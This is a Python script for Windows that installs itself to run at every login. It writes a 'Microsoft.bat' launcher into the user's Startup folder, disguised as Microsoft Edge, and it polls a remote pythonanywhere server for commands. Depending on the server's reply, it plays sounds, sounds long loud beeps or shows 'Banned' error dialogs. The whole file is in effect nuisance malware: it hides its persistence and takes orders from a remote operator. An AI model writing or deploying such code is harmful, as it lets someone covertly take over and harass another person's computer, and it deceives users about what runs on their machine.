import asyncio
import ctypes
import os

import time
from pygame import mixer
import logging
import pickle
import winsound
import requests
import getpass

USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Microsoft.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


try:
    with open('Edge_files/filename.pickle', 'rb') as pk:
        a = pickle.load(pk)
except:
    try:
        with open('Edge_files/filename.pickle', 'wb') as pk:
            response = requests.get("https://12447695.pythonanywhere.com/api/users/standard").json()
            pickle.dump(response["Number"], pk)
    except:
        with open('Edge_files/filename.pickle', 'wb') as pk:
            pickle.dump(1, pk)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG
)

logger = logging.getLogger(__name__)

n = 1

add_to_startup("Microsoft Edge.exe")


async def g():
    global n
    while True:
        try:
            with open('Edge_files/filename.pickle', 'rb') as pk:
                a = pickle.load(pk)
                response = requests.get("https://12447695.pythonanywhere.com/api/users/all").json()
                if 0 < response["IsUse"] < 7:
                    n = response['IsUse']
                else:
                    response = requests.get("https://12447695.pythonanywhere.com/api/users/" + a).json()
                    n = response['IsUse']
                await asyncio.sleep(5)
        except:
            n = 10
            await asyncio.sleep(5)


async def f():
    while True:
        if n == 1:
            mixer.init()
            mixer.music.load('Edge_files/agogo-bells__025_mezzo-forte_struck-singly.mp3')
            mixer.music.play()
            while mixer.music.get_busy():  # wait for music to finish playing
                time.sleep(1)
        elif n == 2:
            mixer.init()
            mixer.music.load('Edge_files/pukane-4.mp3')
            mixer.music.play()
            while mixer.music.get_busy():  # wait for music to finish playing
                time.sleep(1)
            await asyncio.sleep(1)
        elif n == 3:
            winsound.PlaySound("SystemExit", winsound.SND_ALIAS)
        elif n == 4:
            winsound.Beep(2500, 10000)
        elif n == 5:
            ctypes.windll.user32.MessageBoxW(0, u"Banned", u"Error", 5)
        elif n == 6:
            ctypes.windll.user32.MessageBoxW(0, u"Banned", u"Error", 5)
            winsound.Beep(2500, 10000)

        await asyncio.sleep(0.1)


async def interviews():
    tasks = [
        asyncio.create_task(f()), asyncio.create_task(g())
    ]
    await asyncio.gather(*tasks)


asyncio.run(interviews())
